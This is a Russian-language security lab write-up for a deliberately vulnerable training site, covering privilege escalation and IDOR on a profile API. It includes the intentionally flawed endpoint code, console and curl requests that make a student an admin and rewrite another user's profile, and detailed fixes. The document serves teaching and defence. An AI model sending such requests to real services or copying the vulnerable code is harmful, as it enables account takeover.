# Уязвимость №3: профиль пользователя на странице `/profile`

Учебный стенд: [DB_SEC_SITE](https://github.com/Wheatgrh/DB_SEC_SITE)  
Раздел интерфейса: **Профиль** → `http://localhost:3000/profile`  
Тип уязвимости: **Broken Access Control** (повышение привилегий + IDOR), **не SQL-инъекция**

> Файл назван `sql_injection_3.md` как третье практическое задание стенда. На этой странице SQL-запросы параметризованы (`$1`, `$2`…). Уязвимость — в доверии к данным HTTP-запроса на уровне приложения.

---

## Краткое описание

Страница профиля позволяет изменить имя и email. Сохранение идёт через API:

```
POST /api/users/{id}/profile
```

Сервер **не проверяет**:

1. что `{id}` в URL совпадает с ID текущей сессии (IDOR);
2. что пользователь с ролью `student` не может менять поле `role` (повышение привилегий).

В HTML-форме поля `roleName` нет, но API его принимает. Студент `alice` может отправить скрытое поле `roleName=admin` и стать администратором.

В журнале аудита есть прямая подсказка: *«Changed alice from student to manager during a prior exercise.»*

---

## Затронутые файлы

| Файл | Роль в уязвимости |
|------|-------------------|
| `src/routes/api/users/[id]/profile/+server.ts` | **Основной источник**: доверяет `params.id` и `roleName` из запроса |
| `src/lib/server/db.ts` | `updateUserProfile` — при наличии `roleName` обновляет колонку `role` |
| `src/routes/profile/+page.svelte` | Отправляет POST на `/api/users/{id}/profile`; в форме нет `roleName` |
| `src/routes/profile/+page.server.ts` | Загружает профиль только для `locals.user.id` (сама страница безопасна) |
| `src/hooks.server.ts` | При каждом запросе читает роль из БД — смена роли видна сразу после обновления |
| `db/init/02-seed.sql` | UUID пользователей и роли для тестов |

---

## Идентификаторы пользователей (из seed-данных)

| Пользователь | UUID | Роль | Пароль |
|--------------|------|------|--------|
| alice | `8b8dea67-7624-4e41-9452-100cb4256805` | student | alice123 |
| bob | `8ce21d94-2285-4cfa-9462-8d886261a847` | manager | bob123 |
| carol | `c6710eaa-49cf-4fb5-b5f2-5db37748e1cc` | admin | carol123 |

---

## Как устроена уязвимость

### 1. Интерфейс (кажется безопасным)

Форма на `/profile` содержит только:

- `fullName`
- `email`

```17:20:src/routes/profile/+page.svelte
			const response = await fetch(`/api/users/${data.profile.id}/profile`, {
				method: 'POST',
				body: formData
			});
```

Пользователь не видит способа сменить роль.

### 2. API принимает лишние поля

```14:28:src/routes/api/users/[id]/profile/+server.ts
	const form = await request.formData();
	const fullName = String(form.get('fullName') ?? '').trim();
	const email = String(form.get('email') ?? '').trim();
	const roleName = String(form.get('roleName') ?? '').trim();

	// Intentional vulnerability for the lab: route id and optional roleName are trusted from the request.
	await updateUserProfile(userId, {
		fullName,
		email,
		roleName: roleName || undefined
	});
```

**Проблемы:**

| Проверка | Есть? |
|----------|-------|
| `params.id === locals.user.id` | Нет |
| Запрет `roleName` для не-admin | Нет |
| Whitelist допустимых ролей на уровне API | Нет |

### 3. Обновление роли в БД

```185:195:src/lib/server/db.ts
	if (roleName) {
		await pool.query(
			`
				UPDATE training.app_users
				SET full_name = $1,
				    email = $2,
				    role = $3
				WHERE id = $4
			`,
			[fields.fullName, fields.email, roleName, userId]
		);
```

SQL здесь **безопасен** (параметризация). Уязвимость — в **логике приложения**: любой авторизованный клиент может передать `roleName`.

### 4. Почему смена роли сразу видна в UI

`hooks.server.ts` при каждом запросе загружает пользователя из БД по cookie `session_id`. После `UPDATE` роль в шапке меняется без повторного входа.

---

## Предусловия для проверки

1. Запущен стенд: `docker compose up --build`
2. Приложение: http://localhost:3000
3. Вход: `alice` / `alice123`
4. Открыта страница: http://localhost:3000/profile
5. В шапке: **Сессия: alice (student)**

---

## Пошаговая проверка уязвимости

### Шаг 1. Контроль — исходное состояние

1. Откройте http://localhost:3000/profile
2. Убедитесь, что в шапке: `alice (student)`
3. Запомните UUID alice: `8b8dea67-7624-4e41-9452-100cb4256805`

---

### Шаг 2. Повышение привилегий (скрытое поле `roleName`)

1. На странице профиля нажмите **F12** → вкладка **Console**
2. Вставьте и выполните:

```javascript
const fd = new FormData();
fd.append('fullName', 'Alice Student');
fd.append('email', 'alice@corp.local');
fd.append('roleName', 'admin');  // поля нет в форме, API принимает

const res = await fetch('/api/users/8b8dea67-7624-4e41-9452-100cb4256805/profile', {
  method: 'POST',
  body: fd
});

console.log(res.status, await res.json());
```

**Ожидаемый результат:** `200 { ok: true }`

3. Обновите страницу (**F5**)

**Ожидаемый результат:** в шапке **alice (admin)** вместо `student`.

**Вывод:** студент повысил себе роль до admin без прав администратора.

---

### Шаг 3. Альтернатива — роль `manager`

Повторите шаг 2 с:

```javascript
fd.append('roleName', 'manager');
```

**Ожидаемый результат:** в шапке `alice (manager)` — соответствует сценарию из журнала аудита.

---

### Шаг 4. IDOR — изменение чужого профиля

Снова войдите как `alice` (если меняли роль — для чистоты эксперимента можно пересоздать БД: `docker compose down -v && docker compose up --build`).

В консоли выполните:

```javascript
const fd = new FormData();
fd.append('fullName', 'Hacked Bob');
fd.append('email', 'hacked@evil.local');
fd.append('roleName', 'student');

const res = await fetch('/api/users/8ce21d94-2285-4cfa-9462-8d886261a847/profile', {
  method: 'POST',
  body: fd
});

console.log(res.status, await res.json());
```

UUID `8ce21d94-...` — это **bob**, не alice.

**Проверка:**

1. Выйдите (**Выход**)
2. Войдите как `bob` / `bob123`
3. Откройте **Профиль**

**Ожидаемый результат:** имя `Hacked Bob`, email `hacked@evil.local`, роль `student` (если передали `roleName`).

**Вывод:** API не проверяет, что пользователь может менять только свой профиль.

---

### Шаг 5. Доказательство через DevTools → Network

1. **F12** → **Network**
2. Выполните код из шага 2
3. Найдите запрос `POST .../api/users/.../profile`
4. Во вкладке **Payload** / **Form Data**:

   ```
   fullName: Alice Student
   email: alice@corp.local
   roleName: admin
   ```

5. В ответе: `{"ok":true}`

Это фиксирует, что поле `roleName` уходит на сервер, хотя в HTML-форме его нет.

---

### Шаг 6. Проверка через curl (опционально)

После входа в браузере скопируйте cookie `session_id` из DevTools → Application → Cookies.

```bash
curl.exe -X POST "http://localhost:3000/api/users/8b8dea67-7624-4e41-9452-100cb4256805/profile" \
  -H "Origin: http://localhost:3000" \
  -H "Cookie: session_id=<ваш_session_id>" \
  -F "fullName=Alice Student" \
  -F "email=alice@corp.local" \
  -F "roleName=admin"
```

**Ожидаемый результат:** `{"ok":true}`

---

## Сводная таблица сценариев

| Сценарий | URL / тело запроса | Кто атакует | Эффект |
|----------|-------------------|-------------|--------|
| Повышение до admin | POST `/api/users/{alice_id}/profile` + `roleName=admin` | alice (student) | alice → admin |
| Повышение до manager | + `roleName=manager` | alice | alice → manager |
| IDOR на bob | POST `/api/users/{bob_id}/profile` | alice | Профиль bob изменён |
| Понижение bob | + `roleName=student` | alice | bob теряет роль manager |

---

## Влияние (Impact)

- **Целостность:** произвольное изменение профилей других пользователей
- **Конфиденциальность:** с ролью admin/manager возможен доступ к функциям, закрытым для student
- **Доступность / бизнес-логика:** понижение роли менеджера блокирует его рабочие процессы
- **Эскалация:** в сочетании с SQL-инъекциями №1 и №2 атакующий может сначала узнать UUID, затем менять роли

---

## Почему это не SQL-инъекция

| Критерий | `/catalog`, `/reports` | `/profile` |
|----------|------------------------|------------|
| Ввод в SQL-строку | Да | Нет |
| Параметризация | Нет / частично | Да (`$1`…`$4`) |
| Тип CWE | CWE-89 SQL Injection | CWE-639 IDOR, CWE-269 Privilege Escalation |
| Вектор | Подмена SQL | Подмена HTTP-параметров |

---

## Как исправить

Исправление на уровне **авторизации и контракта API**, не SQL.

---

### Исправление 1. Проверка владельца ресурса (обязательно)

**Файл:** `src/routes/api/users/[id]/profile/+server.ts`

**Что добавить:** запретить менять чужой профиль (кроме admin с отдельной логикой).

**Было:**

```typescript
const userId = params.id.trim();
// ... сразу updateUserProfile(userId, ...)
```

**Стало:**

```typescript
const userId = params.id.trim();

if (userId !== locals.user.id) {
    error(403, 'You can only update your own profile');
}

await updateUserProfile(userId, {
    fullName,
    email
    // roleName не передаём
});
```

---

### Исправление 2. Убрать смену роли из `updateUserProfile`

**Файл:** `src/lib/server/db.ts`

**Что сделать:** профиль обновляет только `full_name` и `email`. Смена роли — отдельная функция с проверкой прав.

**Было:**

```typescript
export async function updateUserProfile(
    userId: string,
    fields: { fullName: string; email: string; roleName?: string }
) {
    const roleName = fields.roleName?.trim();
    if (roleName) {
        await pool.query(`UPDATE ... SET role = $3 ...`, [...]);
        return;
    }
    await pool.query(`UPDATE ... SET full_name = $1, email = $2 ...`, [...]);
}
```

**Стало:**

```typescript
export async function updateUserProfile(
    userId: string,
    fields: { fullName: string; email: string }
) {
    await pool.query(
        `UPDATE training.app_users
         SET full_name = $1, email = $2
         WHERE id = $3`,
        [fields.fullName, fields.email, userId]
    );
}
```

Смена роли — только через `updateUserRole`, вызываемую из admin-эндпоинта.

---

### Исправление 3. Отдельный admin-эндпоинт для ролей

**Файл:** создать `src/routes/api/admin/users/[id]/role/+server.ts` (новый)

```typescript
import { error, json } from '@sveltejs/kit';
import { updateUserRole } from '$lib/server/db';

const ALLOWED_ROLES = new Set(['student', 'manager', 'admin']);

export async function POST({ locals, params, request }) {
    if (!locals.user || locals.user.role !== 'admin') {
        error(403, 'Admin only');
    }

    const { role } = await request.json();
    if (!ALLOWED_ROLES.has(role)) {
        error(400, 'Invalid role');
    }

    await updateUserRole(params.id, role);
    return json({ ok: true });
}
```

**Файл:** `src/routes/api/users/[id]/profile/+server.ts` — **удалить** чтение `roleName` из formData.

---

### Исправление 4. Не принимать `roleName` даже если клиент пришлёт

**Файл:** `src/routes/api/users/[id]/profile/+server.ts`

Явно игнорировать лишние поля:

```typescript
// Не читать roleName из request — контракт API только fullName + email
await updateUserProfile(locals.user.id, { fullName, email });
```

Использовать `locals.user.id` вместо `params.id`, либо сверять их (см. исправление 1).

---

### Исправление 5. Аудит смены ролей

**Файл:** `src/lib/server/db.ts`

При смене роли через admin-API писать в `training.audit_events`:

```typescript
export async function updateUserRole(
    actorUsername: string,
    userId: string,
    roleName: string
) {
    await pool.query(
        'UPDATE training.app_users SET role = $1 WHERE id = $2',
        [roleName, userId]
    );
    await pool.query(
        `INSERT INTO training.audit_events (actor_username, action, details)
         VALUES ($1, 'role_change', $2)`,
        [actorUsername, `Changed user ${userId} to ${roleName}`]
    );
}
```

---

### Исправление 6. Ограничения на уровне БД (дополнительно)

**Файл:** `db/init/01-schema.sql`

Выдать `app_user` только `UPDATE` на `full_name`, `email` — **не** на `role` (через отдельную роль `app_admin` или триггер):

```sql
CREATE OR REPLACE FUNCTION training.prevent_role_self_update()
RETURNS trigger
LANGUAGE plpgsql
AS $$
BEGIN
    IF NEW.role IS DISTINCT FROM OLD.role
       AND current_setting('app.allow_role_change', true) IS DISTINCT FROM 'true'
    THEN
        RAISE EXCEPTION 'role change not allowed';
    END IF;
    RETURN NEW;
END;
$$;

CREATE TRIGGER guard_role_update
    BEFORE UPDATE ON training.app_users
    FOR EACH ROW
    EXECUTE FUNCTION training.prevent_role_self_update();
```

Admin-сессия перед сменой роли выставляет `set_config('app.allow_role_change', 'true', true)` внутри транзакции.

---

## Проверка после исправления

| Тест | До исправления | После исправления |
|------|----------------|-------------------|
| POST с `roleName=admin` от alice | 200, роль admin | 403 или роль не меняется |
| POST на UUID bob от alice | 200, профиль bob изменён | 403 Forbidden |
| Легитимное сохранение имени/email | 200 | 200 |
| Смена роли через admin API | — | 200 только для carol/admin |

Дополнительно: в Network payload поле `roleName` не должно влиять на ответ.

---

## Сравнение с заданиями №1 и №2

| | №1 `/catalog` | №2 `/reports` | №3 `/profile` |
|--|---------------|---------------|---------------|
| Тип | SQL Injection | SQL Injection (в функции БД) | Broken Access Control |
| Ввод | GET `q` | POST `whereClause` | POST `roleName`, URL `{id}` |
| Слой | Node.js + БД | PostgreSQL `SECURITY DEFINER` | Только приложение |
| Типичная атака | `' OR '1'='1` | `1=1` | `roleName=admin` |
| Документ | `sql_injection_1.md` | `sql_injection_2.md` | `sql_injection_3.md` |

---

## Чеклист для отчёта по практике

- [ ] Указано: это не SQL-инъекция, а IDOR / privilege escalation
- [ ] Описан эндпоинт `POST /api/users/{id}/profile`
- [ ] Показано скрытое поле `roleName` в DevTools
- [ ] Зафиксирован переход `alice (student)` → `alice (admin)`
- [ ] Продемонстрирован IDOR на профиле bob
- [ ] Описано исправление: проверка `locals.user.id`, удаление `roleName` из API
- [ ] Упомянут отдельный admin-эндпоинт для смены ролей

---

## Связанные уязвимости на стенде

- **Инъекция №1** — `/catalog` → `sql_injection_1.md`
- **Инъекция №2** — `/reports` → `sql_injection_2.md`
- **Invoice demo** — IDOR по UUID счёта (`/invoices/[id]`) — отдельная уязвимость без SQL

Данный документ относится к уязвимости №3 на странице `/profile` и связанном API.
